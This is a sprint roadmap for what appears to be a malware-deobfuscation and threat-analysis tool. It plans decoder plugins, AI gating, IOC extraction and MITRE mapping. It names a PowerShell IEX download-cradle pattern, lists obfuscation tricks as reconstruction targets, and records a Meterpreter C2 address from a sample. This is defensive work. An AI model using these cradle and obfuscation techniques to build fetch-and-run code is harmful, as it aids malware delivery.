- Phase E · Split `wrapper_archetypes.py` → `/archetypes/*.py` (L1 refactor)
- Phase F · Split `analysis_core.py` threat-intel → `/threat_intel/*.py` (L3) + 3 family plugins (Meterpreter, AsyncRAT, Lumma)
- Phase G · Cut-over: remove legacy engines, `NIVX_ENGINE=orchestrator` becomes default

### Diagnostic completed this session
- `Testing for NonAI` case: legacy engine ✅ works deterministically (98% conf, IP `149.28.81.19`, Meterpreter detected in ~5s). Original 55s timeout was AI leg, not decoder.
- `Need_analysis` case: engine correctly stops at 45% because payload uses a custom-alphabet base-N cipher we don't yet have a plugin for. Not a bug — missing capability. Will be closed in Phase C when ascii85/base91/base92-probe plugins land.
- Pre-existing failure: `test_meterpreter_b64xor.py::test_pipeline_reaches_meterpreter_shellcode` fails identically on `main` (before Phase A). Legacy `deterministic_best_decode(..., analysis_mode="deep")` regression — separate from Phase A scope.



## Session 1 (DONE · this commit)

| # | Deliverable | File(s) |
|---|---|---|
| 1 | Global AI toggle — env default + admin override with `/api/ai/toggle` GET/POST | `routers/ai.py` |
| 2 | AI admission check gates every AI endpoint | `routers/ai.py::_ai_admission_check` |
| 3 | Credit guard: rate limit (10/h, 50/d), budget cap (500 credits/mo), SHA1 cache | `ai_credit_guard.py`, `.env` |
| 4 | Modular plugin skeleton | `/app/backend/decoders/`, `/normalizers/`, `/extractors/`, `/heuristics/` |
| 5 | First decoder plugin — `base64-decode` proving the contract | `decoders/base64.py` |
| 6 | Regression lock extended from 12 → 15 tests | `tests/test_regression_lock.py` |
| 7 | Env-tunable SLAs | `.env` — NIVX_AI_ENABLED, NIVX_AI_DEADLINE_S, … |

---

## Sprint plan (2 weeks)

## Session 2 (LOCKED · arch-first before decoder expansion)

Per case "Need_analysis" review — order MUST be:

### Phase 2A · Architecture (do first, non-negotiable)
1. **Plugin-based decoder framework** — every decoder implements `detect()` +
   `decode()` contract, auto-registered via `decoders/__init__.py`
2. **Recursive decode engine v2** — iterates `all_plugins()` by
   `detect()` confidence, hard recursion cap (12) + wall-time cap (5s)
3. **Decoder Trace Engine** — every layer emits standard record:
   `{decoder_name, detect_confidence, input_size, output_size,
     exec_time_ms, preview_200, full_output, why_selected, warnings}`

### Phase 2B · Analyst-friendly "BROKEN" recovery flow
When base64 (or any codec) fails structurally, do NOT show bare "BROKEN".
Emit graceful diagnostic:
- ⚠️ Invalid Base64 detected (X chars)
- Recovery attempts tried:
  * Strip whitespace/newlines
  * Fix missing padding (=)
  * Trim 1-3 trailing chars if length becomes 4k/4k+2/4k+3
  * Re-detect all other codecs (maybe not base64 at all)
- Only if ALL recovery fails → clear "why decoding stopped" reason

### Phase 2C · Decoder coverage (AFTER 2A + 2B)
- Base58, Base85, Brotli, LZMA (currently missing)
- Nested archive extraction

### Phase 2D · Frontend Decoder Trace UI
Each layer row must show:
- Decoder name + category
- Detection confidence bar
- Input size / Output size (side by side)
- Execution time (ms)
- Preview (first 200 chars, monospace)
- 📋 COPY button
- "Why selected" tooltip
- Expandable "full output" viewer

## Non-negotiables (reinforced)
- AI is opt-in, never the core decoder
- Deterministic engine is the product
- Every new decoder ships with pytest unit tests
- Regression lock (15 tests, growing) runs before every deploy
- Backward compatibility — do NOT remove existing features
- Port existing decoders into `decoders/*.py` plugin files:
  base32, base58, base85, hex, xor, gzip, zlib, lzma, brotli,
  utf16, reverse, rot13, rot47, url, html, unicode, decimal, octal
- Refactor `smart_decoder.py` to iterate `decoders.all_plugins()` and pick
  by `detect()` confidence; never stop until no plugin above threshold.
- Add hard recursion cap (default 12 layers) + wall-time cap (5 s per input).
- **Decoder Trace Engine** — every plugin emits a standard trace record:
  `{decoder_id, decoder_name, category, input_size, output_size,
    detect_confidence, exec_time_ms, preview, full_output, warnings}`.
- Frontend `<DecoderTracePanel />` extended with per-row COPY button,
  exec-time-ms column, confidence bar, expandable "full output" viewer.

### SDLC — Git branching for Session 2
- Baseline tag: `v1.0.0-baseline` (frozen after Session 1 deploys to prod)
- Feature branch: `feature/plugin-decoder-engine`
- Merge-gate: 15 regression locks pass + battery 12/12 + manual smoke
- Rollback: `git checkout v1.0.0-baseline` OR Emergent platform rollback

### Priority 2 — Decoder Coverage (Session 2/3)
- Add Base58, Base85, Brotli, LZMA (missing today).
- Auto-detect Gzip/Zlib members inside larger buffers.
- Nested archive extraction (ZIP/CAB/GZip).

### Priority 3 — PowerShell Reconstruction (Session 3)
- `[char]0x41` + `[char]65` + `[char]65,66,67 -join ''`
- `-f` operator format-string reconstruction
- `${env:X}` / `$env:X` expansion
- IEX cradle un-wrap (`(New-Object Net.WebClient).DownloadString()`)
- Reverse-array + Split/Join + Replace

### Priority 4 — CMD Reconstruction (Session 3)
- `^` in-string escape (already have basic strip-carets)
- `%VAR%` env expansion (recursive)
- `!VAR!` delayed expansion
- `&&`, `||`, `|` chain segmentation for per-stage analysis

### Priority 5 — IOC Extraction (Session 4)
- Move to `extractors/ioc.py`
- Add named pipes, mutex, service names, scheduled task names,
  API-call names (DLLs + exports), user-agent strings

### Priority 6 — MITRE Mapping (Session 4)
- Move to `extractors/mitre.py`
- Expand rule library from ~40 → 150 techniques
- Include ATT&CK sub-techniques
- Emit per-technique `confidence` + `reason` (as per Ideas doc)

### Deferred (post-sprint)
- Priority 7 — Threat scoring family heuristics (18-20 family files under `heuristics/`)
- Priority 8 — Knowledge base + Jaccard similarity ("94% similar to previous DarkGate")
- UI: Timeline view, collapsible cards, PDF export
- Performance: streaming decode, memory optimisation

---

## Non-negotiables

- **Do NOT remove existing features** — backward compatibility preserved.
- **Every decoder plugin ships with pytest unit tests.**
- **Every archetype ships with 2+ real-world samples.**
- **Regression lock (`test_regression_lock.py`) runs before every deploy.**
- **AI is opt-in. Deterministic works when AI is OFF.**

---

## Success criteria (end of sprint)

- ✅ 200+ archetypes (from 71)
- ✅ 18+ codec plugins in `decoders/`
- ✅ Full PS + CMD reconstruction
- ✅ 150+ MITRE techniques mapped
- ✅ AI-disabled mode produces analyst-ready reports (IOCs, MITRE, verdict, decode chain, LOLBAS)
- ✅ 100% regression pass on the multi-layer battery
- ✅ Modular architecture enables new decoders in <30 min

---

## API surface (added in Session 1)

- `GET  /api/ai/toggle` — current toggle state
- `POST /api/ai/toggle` — admin flips it (`{enabled: bool}`)
- `GET  /api/ai/budget` — monthly credit burn dashboard
- `POST /api/ai/auto-decode` — now respects admission check + credit guard
- `GET  /api/benchmark/multilayer` — battery report (12/12 pass)

---

## Backlog stays parked

- P0 Auto-Escalation Orchestrator SLAs (Q1-Q5 still open — user hasn't answered)
- P0 L4 NivX Crucible sandbox — deferred **indefinitely** per Ideas_updated.docx ("NO sandbox")
- P1 Qwen fine-tune activation — parked
- Learner auto-loop to L4 — blocked on L4 (which is now cancelled), redirect to L1 archetype auto-promotion
- Multi-tenant SaaS (P3)
- Per-feature snapshot rollback (P3)
